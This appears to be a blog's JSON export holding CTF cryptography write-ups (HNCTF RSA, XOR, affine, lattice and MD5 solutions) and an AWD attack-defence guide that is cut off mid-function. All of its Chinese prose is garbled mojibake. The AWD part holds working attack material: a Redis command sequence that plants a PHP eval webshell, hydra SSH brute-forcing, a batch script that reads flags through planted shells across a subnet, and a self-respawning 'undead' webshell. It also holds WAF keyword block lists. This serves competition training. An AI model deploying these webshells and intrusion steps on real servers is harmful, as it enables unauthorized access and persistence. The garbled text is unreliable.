62193160459999883112594854240161159254035770172137079047232757011759606702281\n# 17331436837911040930486942133359735652484926528331507431552667656734821231501å¸¸è§„rsaé¢˜è§£ï¼Œåˆ†è§£pï¼Œqå°±è¡Œäº†ï¼Œä»£ç å°±ä¸è¯¦ç»†å†™äº†\n[Week1]ä½ æƒ³å­¦å¯†ç å—ï¼Ÿæ‰§è¡Œä»£ç å°±è¡Œäº†\n[Week1]XXXOOORRRtxtfrom flag import flag\nfrom Crypto.Util.number import *\nimport os\n\nrandBytes = [bytes_to_long(os.urandom(64)) for _ in range(3)]\nm = bytes_to_long(flag)\n\nprint(f&#39;a = &#123;randBytes[0]&#125;&#39;)\nprint(f&#39;b = &#123;randBytes[0] ^ randBytes[1]&#125;&#39;)\nprint(f&#39;c = &#123;randBytes[1] ^ randBytes[2]&#125;&#39;)\nprint(f&#39;d = &#123;m ^ randBytes[0] ^ randBytes[1] ^ randBytes[2]&#125;&#39;)\n\n&#39;&#39;&#39;\na = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234\nb = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618\nc = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479\nd = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560\n&#39;&#39;&#39;äº†è§£å¼‚æˆ–çš„æ€§è´¨å°±è¡Œäº†\ntxtfrom Crypto.Util.number import *\nimport os\n\n\n\na = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234\nb = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618\nc = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479\nd = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560\n\nprint(long_to_bytes(a^b^a^b^c^a^d))\nNSSCTF&#123;XOR_ha5_many_propertie5_and_thi5_i5_ju5t_one_of_them&#125;[Week1]çˆ±å¦ƒtxtfrom secret import flag\nfrom random import getrandbits\nfrom string import *\n\ndef encrypt(message,a,b,m):\n    return bytes([(i*a+b)%m for i in message])\n\na,b = getrandbits(4),getrandbits(8)\nprint(f&#39;c = &#123;encrypt(flag,a,b,1&lt;&lt;8)&#125;&#39;)\n\n# c = b&#39;y\\xba\\xba\\xea\\xc7\\x11\\xc2\\xc7\\xcb\\xd8ZV\\xd8ZVp\\xb1\\xb1\\xd8\\x19\\xa4V\\xa4\\x19\\x8aM\\xa83g\\xd8&amp;\\x19\\xdc&#39;ä»¿å°„å¯†ç \næ±‚å‡ºaï¼Œb\ntxtr a in range(2**3,2**4):\n    for b in range(2**7,2**8):\n        if encrypt(b&#39;NSSCTF&#39;,a,b,1&lt;&lt;8)==c[0:6]:\n            print(a)\n            print(b)å†™é€†å‘è§£å¯†\ntxtfrom string import *\nimport gmpy2\nc = b&#39;y\\xba\\xba\\xea\\xc7\\x11\\xc2\\xc7\\xcb\\xd8ZV\\xd8ZVp\\xb1\\xb1\\xd8\\x19\\xa4V\\xa4\\x19\\x8aM\\xa83g\\xd8&amp;\\x19\\xdc&#39;\nmessaget=b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;_&#39;\ndef encrypt(message,a,b,m):\n    return bytes([(i*a+b)%m for i in message])\nfrom Crypto.Util.number import *\na=13\nb=131\nm=1&lt;&lt;8\ndef decrypt(message,a,b,m):\n    return bytes([(i-b)*gmpy2.invert(a,m)%m for i in message])\nprint(decrypt(c,a,b,m))\nNSSCTF&#123;This_is_affine_encryption&#125;[WEEK2]littleLatticeç®€å•æ ¼å¯†ç \ntxth = 26523576589113781532769165293024254940419790396713708680496148398686334583553504180195363282085884580924842673123375450894537445679687851322807762432476357713740302064160599132450619363411158141423252170448770929403179895813409897048848337375715079396639330537231353596884530617911351334318435031007342479134081403319324838464987064025256038807217697133175585927493402963025439540077915248356077623612217525231722274634984400273765262532561558296870531741633238736650375250957780701118781183335729715295271752736307479795186963108377228330313771245434127095507278278768792281414702334956407755841000748255424212840137\np = 29908110980126088961686288727545150169450107297750996656924523214377817308111189721234667959695817050736874247951762130190209278324144437406652857446810518839546701950883392761869656586963587376306050382973323860395932741791372333809871487575268245618618143456971257992301722141464238875859134379745122404533776003095129169004284619647906206323263396219776072091827094295366090100037898314156271404760715453914459484087562963158208356228410105170495322276351631637885450926240143055767142216931354736779666836018983658010126520397012025067407223630891975504746697630878807952266767406899527721170062789607980517722293\n\nL = matrix(ZZ, [[1, h],[0, p]])\nv = L.LLL()[0]\nprint(v)ç„¶åå¸¦è¿›å»å°±è¡Œäº†\ntxtprint(&#39;NSSCTF&#123;&#39; + md5(bytes.fromhex(hex(f+g)[2:])).hexdigest() + &#39;&#125;&#39;)[WEEK2]Chaos[WEEK2]RSA againå¸¸è§„rsa\ntxtimport gmpy2\nimport libnum\ndef de(c, e, n):\n    k = 0\n    while True:\n        mm = c + n*k\n        result, flag = gmpy2.iroot(mm, e)\n        if True == flag:\n            return result\n        k += 1\nn = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333\nc = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125\ne=3\nm=de(c,e,n)\nprint(m)\nprint(libnum.n2s(int(m)))\nNSSCTF&#123;Key_should_not_be_too_small&#125;[WEEK2]strange RSAtxtfrom Crypto.Util.number import *\nfrom secret import flag\n\npad = lambda x:x + bytes([16 - len(x)%16] * (16 - len(x)%16))\nm = bytes_to_long(pad(flag))\np = getPrime(100)\nq = getPrime(100)\nn = p*p*q*q\ne = 0x10001\nc = pow(m,e,n)\n\nprint(f&#39;n = &#123;n&#125;&#39;)\nprint(f&#39;c = &#123;c&#125;&#39;)\nprint(f&#39;e = &#123;e&#125;&#39;)\n\n&#39;&#39;&#39;\nn = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761\nc = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013\ne = 65537\n&#39;&#39;&#39;å’Œå¼ºç½‘æ¯çš„ASRç±»ä¼¼ï¼Œå…ˆåˆ†è§£nï¼Œä¹‹åå¯¹phiå¤„ç†\ntxtimport gmpy2\nfrom Crypto.Util.number import *\nimport sympy\np = 709662686105519282917793669093\nq = 1058314117179226194777612760717\nn = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761\nc = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013\ne = 65537\nphi=(p-1)*(q)*(p)*(q-1)\nd=gmpy2.invert(e, phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nNSSCTF&#123;You_should_use_tool&#125;[WEEK2]solve_the_equationè§£æ–¹ç¨‹å‘—\ntxtfrom Crypto.Util.number import bytes_to_long, getPrime\nfrom gmpy2 import *\nfrom flag import flag\nm = bytes_to_long(flag)\np = getPrime(2048)\nq = getPrime(2048)\nn = p * q\ne = 65537\ngift = 2022 * p + 9 * q + 28 * e\nc = pow(m,e,n)\nprint(n,c,gift)\n# 559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797\n# 73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925\n# 63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761\ntxtimport gmpy2\nfrom Crypto.Util.number import *\nimport sympy\nn=559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797\nc=73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925\ngift=63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761\ne=65537\np,q=sympy.symbols(&#39;p q&#39;)\na=sympy.solve([p*q-n,2022 * p + 9 * q + 28 * e-gift],[p,q])\nprint(a)\np=31488299927163782375594305784598354985055343576902151378139638110290196067918972709864013036909993584566357500427488971564319756822589646977081872239028723217808372250207143372686512583814138881980368846428364451724191019810210583450208745323418623199057207740178726519465136933610452840086315545766227500114368026151391214297362847972215483754128409704386255997220347329566039222555930464490406419002226257326118774942404683970363544788642504594073256844610344691049585870560973659315882902006631997716334351866723219577903275769313404136367236735062099234386473703566068495328080598914833401280780692803508570349879\nq=17753062588733343270481973113408741177364273466266578137604693537521130628067514464616655876995871735360322066932727884076111196635241747675042626304508770586691927800281585936137657405193182456402216484778567926375452998098111716574027285177466244350043079827469560084278792340806640810521556665260999347942843603815228875925103340718552529438783648172063716949726071718858811605089496505238883332792493647818670062684514188459512366295227468596668231188353669195967903222039580635681985850471261694526218866731687175727118621937360285536800367141087950091875609247828705723374310716178275472084635608436063660110043\nphi=(p-1)*(q-1)\nd=gmpy2.invert(e, phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nNSSCTF&#123;S4g3_is_4_g00d_thing&#125;[WEEK2]hashè€å¥—è·¯é¢˜ç›®äº†ï¼Œæœ€è¿‘æ¯”èµ›å¾ˆå¤šè§ï¼Œå†™ä¸ªäº¤äº’å°±è¡Œäº†\ntxtfrom hashlib import *\nfrom pwn import *\nimport itertools\nstrings=string.ascii_letters + string.digits\ndef proof_of_work(end,sha):\n    num=4\n    strings_list=itertools.permutations(strings,int(num))\n    for start in strings_list:\n        start=&#39;&#39;.join(start)\n        if sha256((start+end.decode()).encode()).hexdigest()==sha.decode():\n            print(start)\n            return start\nip=&#39;1.14.71.254&#39;\nport=28759\nio=remote(ip,port)\ncontext.log_level=&#39;debug&#39;\nio.recvuntil(&#39;sha256(XXXX+&#39;)\nmessage=io.recvuntil(&#39;\\n&#39;)[:-1]\nend=message[:16]\nSHA=message[-64:]\nxxxx=proof_of_work(end,SHA)\nio.sendafter(&#39;Give me XXXX&#39;,xxxx)\nio.recvuntil(&#39;You get flag!&#39;)\nprint(io.recvlines(2))[WEEK2]S1mple_ECBäº†è§£ecbçš„æ€§è´¨ï¼Œæ˜¯æ‹¼æ¥çš„ï¼Œå–å‰32ä½å’Œå32ä½ï¼Œåˆ†åˆ«è§£å¯†å°±è¡Œäº†\néš¾åº¦ä¸å¤§\n[WEEK2]a_big_water_problemsageä¸€æŠŠæ¢­\ntxtp=1909085838901160004148366390307428971507303404468754423228343787769448200442038361348125740523088751663337211595662597150812621519152229037912543068209\nt=1722797706292328891382841146705672635973386450156658022578860976717568774388136853606026526614826060041480340908970565567375361451272929245900841087253\nPR.&lt;x&gt; = PolynomialRing(Zmod(p))\nf=x*x-t\nprint(f.roots())\nfrom Crypto.Util.number import *\nprint(long_to_bytes(2552829431219639078757092213205613607180492987942875443078188655619852649786182396933825962365))\nNSSCTF&#123;There_is_no_flag_here_get_away!&#125;[WEEK2]md5å¤ªæ®‹æš´äº†å¸¸è§„çš„md5çˆ†ç ´\ntxtimport hashlib\nplaintext = &#39;flag&#39;\nmd5 = &#39;ac7f4d52c3924925aa9c8a7a1f522451&#39;\nh=&#39;ABCDEFGHIJKLMNOPQRSTUVWSYZ&#39;\nz=&#39;abcdefghijklmnopqrstuvwsyz&#39;\nt=&quot;0123456789&quot;\ny=[]\nh1=&#39;&#39;\nfor m in t:\n    for a in t:\n        for b in t:\n            for c in t:\n                h1=str(m)+str(a)+str(b)+str(c)\n                y.append(h1)\n\n\nfor z in y:\n            plan=&#39;flag&#123;G&#39;+str(0)+str(0)+&#39;d_P4ssw0rd_N3v3r_F0rg3t_63&#39;+z+&#39;&#125;&#39;\n            m = hashlib.md5()\n\n            m.update(plan.encode(&quot;utf-8&quot;))\n            psw = m.hexdigest()\n            if psw[0:4]==&#39;ac7f&#39;:\n                print(plan)\n                flag&#123;G00d_P4ssw0rd_N3v3r_F0rg3t_638291&#125;[WEEK2]mathRSAè§£æ–¹ç¨‹ä¸€æŠŠæ¢­\ntxtimport sympy,gmpy2\nfrom Crypto.Util.number import *\nn = 76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943\ne = 65537\nc = 7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552\nh = 130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446\np,q=sympy.symbols(&#39;p q&#39;)\na=sympy.solve([p*q-n,p**5 - q**4-h],[p,q])\nprint(a)\np=10543357481374908938696626650832667304979816176891429562773232136754485382413647547320866232418359800743787286242710171986152592431595912519025867918658127\nq=7230753434414569972828808651891325142186523078619542872286840414394373161212272545789342965212718184298307353595004152854764254216044770456139231711296409\nphi=(p-1)*(q-1)\nd=gmpy2.invert(e, phi)\nm=pow(c,d,n)\nprint(long_to_bytes(m))\nflag&#123;6d21f18a-831d-4834-8cef-5e47218bc3ce&#125;","slug":"HNCTFé¢˜è§£-Crypto","date":"2023-03-14T10:56:36.000Z","categories_index":"CTF","tags_index":"Crypto","author_index":"xmmlaz"},{"id":"5deac5f75bb01e022a6aa8151fb3a9dd","title":"AWDè¯¦è§£","content":"AWDAWDæœ€ä¸»è¦çš„å°±æ˜¯æ‰‹é€Ÿï¼ï¼ï¼ åŒæ—¶é˜Ÿä¼åˆ†é…ä¸€å®šè¦åˆç†ï¼Œå¯†ç ä¸€å®šç¬¬ä¸€æ—¶é—´æ”¹æ‰ï¼Œä¿®æ”¹å®Œé…ç½®æ–‡ä»¶ä¸€å®šè®°å¾—é‡å¯ä½¿ä¹‹ç”Ÿæ•ˆã€‚\nè¿æ¥SSHshellssh-copy-id -i ~/.ssh/id_rsa.pub root@xx.xx.xx.xx\nssh root@xx.xx.xx.xxæ”¹å¯†ç ssh\nshellpasswd rootç½‘ç«™\nshellç™»å½•ç½‘ç«™åå°ï¼ˆæ™®éæ˜¯å¼±å£ä»¤ï¼Œå¦‚æœä¸æ˜¯å»æ•°æ®åº“ç¿»ä¸€ä¸‹ï¼‰ç„¶åæ”¹å¯†ç mysql\nshellSET PASSWORD FOR root@localhost = PASSWORD(&#39;123456&#39;);æŸ¥çœ‹è¿›ç¨‹shellnetstat -tpnlÂ \nps -df\ntopæ€æ­»è¿›ç¨‹shellkill -9 PID\nkillall åç§°å¦‚æœæ€ä¸æ‰ï¼Œå°±æŸ¥çœ‹çˆ¶è¿›ç¨‹ï¼Œæ€æ‰çˆ¶è¿›ç¨‹ï¼Œå¦‚æœè¿˜ä¸è¡Œç»§ç»­å¾€ä¸ŠæŸ¥ åˆ æ‰æœ¨é©¬æ–‡ä»¶ï¼Œé‡æ–°æ€è¿›ç¨‹\nshellps -ef | grep 3045å¦‚æœè¿›ç¨‹ä¸å…è®¸å…³é—­ å¯ä»¥ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œè¾¾åˆ°æ¬ºéª—ç›®çš„\nshellnc -lv 6666æ‰«æç«¯å£shellnmap -sn xx.xx.xx.0/24\nnmap -sV -Pn -n -v --open xx.xx.xx.0/24æµé‡ç›‘æ§shelltcpdump tcp -i eth0 -t -s 0 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.capå¤‡ä»½ç½‘ç«™shelltar -zcvf web.tar.gz /var/www/htmlå¤‡ä»½æ•°æ®åº“shellmysqldump -uroot -p --databases [dbname] &gt; /tmp/db.sqlfindå‘½ä»¤æŸ¥æ‰¾è¡Œæ•°æœ€çŸ­çš„æ–‡ä»¶\nshellfindÂ ./Â -nameÂ &#39;*.php&#39;Â |Â xargsÂ wcÂ -lÂ |Â sortÂ -uæŸ¥æ‰¾æœ€è¿‘20åˆ†é’Ÿä¿®æ”¹è¿‡çš„æ–‡ä»¶\nshellfind /var/www/html -name *.php -mmin -20æŸ¥æ‰¾å±é™©å‡½æ•°\nshellfind . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;å¼€å¯æ—¥å¿—æ—¥å¿—åŠŸèƒ½åœ¨ /etc/httpd/conf ç›®å½•æœ‰ä¸ª httpd.conf ç›´æ¥ vi/vim ç¼–è¾‘å™¨æ‰“å¼€ç”¨ / æœç´¢ access.log\nè¿™ä¿©å‰é¢å¦‚æœæœ‰ # åˆ æ‰ # ç„¶åä¿å­˜é€€å‡º\nshellCustomLog &quot;logs/access.log&quot; combined\nCustomLog &quot;logs/access.log&quot; commonaccess.log æ˜¾ç¤º POST è¯·æ±‚ä¼ å‚\nshell# LoadModule dumpio_module modules/mod_dumpio.soç„¶åé‡å¯ Apacheï¼Œä½¿ä¿®æ”¹çš„é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ\nshellsystemctl restart httpdç„¶åç›´æ¥ å®æ—¶ æŸ¥çœ‹ access.log æ–‡ä»¶çš„ æ–°å¢ å†…å®¹\nshelltail -f access.logä½¿ç”¨-få‚æ•°æ—¶ä¸ä¼šä¸­æ–­æ–‡ä»¶ç›‘è§†ï¼Œéœ€è¦é€šè¿‡ctrl+cæ‰‹åŠ¨ç»“æŸã€‚\nphp.iniä¸€èˆ¬æ¥è¯´æ–‡ä»¶éƒ½åœ¨ /etc/php.ini\nåœ¨ä¸å½±å“æ­£å¸¸åŠŸèƒ½çš„æƒ…å†µä¸‹ ç¦ç”¨ å±é™©å‡½æ•°\nshelldisable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfoé¢„é˜²SQLæ³¨å…¥\nshellmagic_quotes_gpc = onä¿®å¤è¿œç¨‹æ–‡ä»¶åŒ…å«\nshellallow_url_fopen = off  ï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼‰  \nallow_url_include = offï¼ˆæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ï¼‰åˆ‡è®°ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶é‡å¯\nshellservice php-fpm restartPHPè¯»å–å‡½æ•°shellfile_get_contents()\nhighlight_file()\nfopen()\nreadfile()\nfread()\nfgetss()\nfgets()\nparse_ini_file()\nshow_source()\nfile()\n-----------------------------------\nvar_dump(scandir(&#39;/&#39;)); æ–‡ä»¶åŒ…å«ä¿®å¤ç›´æ¥æŠŠå®ƒç›®å½•é™åˆ¶æ­»åœ¨ /var/www/html\nshellint_set(&quot;open_basedir&quot;,&quot;/var/www/html&quot;);Redisæœªæˆæƒshellconfig set dir path\n\nset feiye &quot;\\n\\n\\n&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;\\n\\n\\n&quot;\n\nconfig set dbfilename service.php\n\nsaveæ‰¹é‡SSHé“¾æ¥shellhydra -l root -p dcn -f ip.txt sshæ‰¹é‡æ”»å‡»è„šæœ¬shellimport requests\nimport re\nurl=[]\nflag=[]\nfor i in range(101,151):\n    url.append(&quot;http://10.0.0./&quot; + str(i))\nfor x in url:\n    postdata = &#123;&#39;cmd&#39;:&quot;system(&#39;cat+/var/www/html/flag&#39;)&quot;&#125;\n    sussess = requests.post(x+&quot;shell.php&quot;,data=postdata)\n    if &#39;flag&#39; in sussess.content:\n        flag.append(re.search(&quot;flag&#123;.*&#125;&quot;,sussess.content))\n        print(flag)\n    else:\n        print(x+&quot;: failed&quot;)\nfor f in flag:\n    inflag=requests.get(&quot;domain.com/flag.php?token=token&amp;flag=&quot;+f)ä¸æ­»é©¬shell&lt;?php\nset_time_limit(0);\nignore_user_abort(true);\nunlink(__FILE__);\nwhile(true)&#123;\n    file_put_contents(&#39;.shell.php&#39;, &#39;&lt;?php @eval($_POST[cmd]);&#39;);\n    usleep(100);\n&#125;\n?&gt;åˆ é™¤ä¸æ­»é©¬shell#!/bin/bash\ndire=&quot;/var/www/html/.shell.php/&quot;\nfile=&quot;/var/www/html/.shell.php&quot;\nrm -rf $file\nmkdir $dire\n./xx.shWAFshell&lt;?php\n$request[&#39;url&#39;] = $_SERVER[&#39;REQUEST_URI&#39;];\n$request[&#39;time&#39;] = date(&#39;Y-m-d H:i:s&#39;);\n\nif($_POST)&#123;\n    foreach($_POST as $k =&gt; $v)&#123;\n        $request[$k]=urldecode($v);\n    &#125;\n&#125;\n\n$file = fopen(&#39;waf.log&#39;,&#39;a&#39;);\nfwrite($file,json_encode($request) . &quot;\\n&quot;);\nfclose($file);\n\nforeach($_POST as $key =&gt; $value)&#123;\n    waf($value);\n&#125;\nforeach($_GET as $key =&gt; $value)&#123;\n    waf($value);\n&#125;\n\nfunction waf($str)&#123;\n    $filed=&#39;flag|cat|less|nl|more|tac|tail|base64|system&#39;;\n    if(preg_match(&quot;/$filed/im&quot;,$str))&#123;\n        exit(&#39;flag&#123;asdfaqawfawfawf&#125;&#39;);\n    &#125;\n&#125;é€šå¸¸WAFshell&lt;?php\ndate_default_timezone_set(&quot;PRC&quot;);\n//è¿™å—åœ¨å¼€å§‹çš„ä»£ç æ²¡æœ‰çš„ï¼Œæˆ‘åŠ çš„ã€‚ä¸åŠ å°±ä¼šæŠ¥é”™ã€‚\n//error_reporting(E_ALL);\n//ini_set(&#39;display_errors&#39;, 1);\n\n/*\n** çº¿ä¸‹æ”»é˜²phpç‰ˆæœ¬waf\n**\n** Author: è½\n*/\n\n/*\næ£€æµ‹è¯·æ±‚æ–¹å¼ï¼Œé™¤äº†getå’Œpostä¹‹å¤–æ‹¦æˆªä¸‹æ¥å¹¶å†™æ—¥å¿—ã€‚\n*/\nif($_SERVER[&#39;REQUEST_METHOD&#39;] != &#39;POST&#39; &amp;&amp; $_SERVER[&#39;REQUEST_METHOD&#39;] != &#39;GET&#39;)&#123;\n    write_attack_log(&quot;method&quot;);\n&#125;\n\n$url = $_SERVER[&#39;REQUEST_URI&#39;]; //è·å–urlæ¥è¿›è¡Œæ£€æµ‹\n\n$data = file_get_contents(&#39;php://input&#39;); //è·å–postçš„dataï¼Œæ— è®ºæ˜¯å¦æ˜¯mutipart\n\n$headers = get_all_headers(); //è·å–header\n\nfilter_attack_keyword(filter_invisible(urldecode(filter_0x25($url)))); //å¯¹URLè¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜åˆ™æ‹¦æˆªå¹¶è®°å½•\nfilter_attack_keyword(filter_invisible(urldecode(filter_0x25($data)))); //å¯¹POSTçš„å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•\n\n/*\næ£€æµ‹è¿‡äº†åˆ™å¯¹è¾“å…¥è¿›è¡Œç®€å•è¿‡æ»¤\n*/\nforeach ($_GET as $key =&gt; $value) &#123;\n    $_GET[$key] = filter_dangerous_words($value);\n&#125;\nforeach ($_POST as $key =&gt; $value) &#123;\n    $_POST[$key] = filter_dangerous_words($value);\n&#125;\nforeach ($headers as $key =&gt; $value) &#123;\n    filter_attack_keyword(filter_invisible(urldecode(filter_0x25($value)))); //å¯¹httpè¯·æ±‚å¤´è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•\n    $_SERVER[$key] = filter_dangerous_words($value); //ç®€å•è¿‡æ»¤\n&#125;\n\n/*\nè·å–httpè¯·æ±‚å¤´å¹¶å†™å…¥æ•°ç»„\n*/\nfunction get_all_headers() &#123; \n    $headers = array(); \n \n    foreach($_SERVER as $key =&gt; $value) &#123; \n        if(substr($key, 0, 5) === &#39;HTTP_&#39;) &#123; \n            $headers[$key] = $value; \n        &#125; \n    &#125; \n \n    return $headers; \n&#125; \n\n\n/*\næ£€æµ‹ä¸å¯è§å­—ç¬¦é€ æˆçš„æˆªæ–­å’Œç»•è¿‡æ•ˆæœï¼Œæ³¨æ„ç½‘ç«™è¯·æ±‚å¸¦ä¸­æ–‡éœ€è¦ç®€å•ä¿®æ”¹\n*/\nfunction filter_invisible($str)&#123;\n    for($i=0;$i&lt;strlen($str);$i++)&#123;\n        $ascii = ord($str[$i]);\n        if($ascii&gt;126 || $ascii &lt; 32)&#123; //æœ‰ä¸­æ–‡è¿™é‡Œè¦ä¿®æ”¹\n            if(!in_array($ascii, array(9,10,13)))&#123;\n                write_attack_log(&quot;interrupt&quot;);\n            &#125;else&#123;\n                $str = str_replace($ascii, &quot; &quot;, $str);\n            &#125;\n        &#125;\n    &#125;\n    $str = str_replace(array(&quot;`&quot;,&quot;|&quot;,&quot;;&quot;,&quot;,&quot;), &quot; &quot;, $str);\n    return $str;\n&#125;\n\n/*\næ£€æµ‹ç½‘ç«™ç¨‹åºå­˜åœ¨äºŒæ¬¡ç¼–ç ç»•è¿‡æ¼æ´é€ æˆçš„%25ç»•è¿‡ï¼Œæ­¤å¤„æ˜¯å¾ªç¯å°†%25æ›¿æ¢æˆ%ï¼Œç›´è‡³ä¸å­˜åœ¨%25\n*/\nfunction filter_0x25($str)&#123;\n    if(strpos($str,&quot;%25&quot;) !== false)&#123;\n        $str = str_replace(&quot;%25&quot;, &quot;%&quot;, $str);\n        return filter_0x25($str);\n    &#125;else&#123;\n        return $str;\n    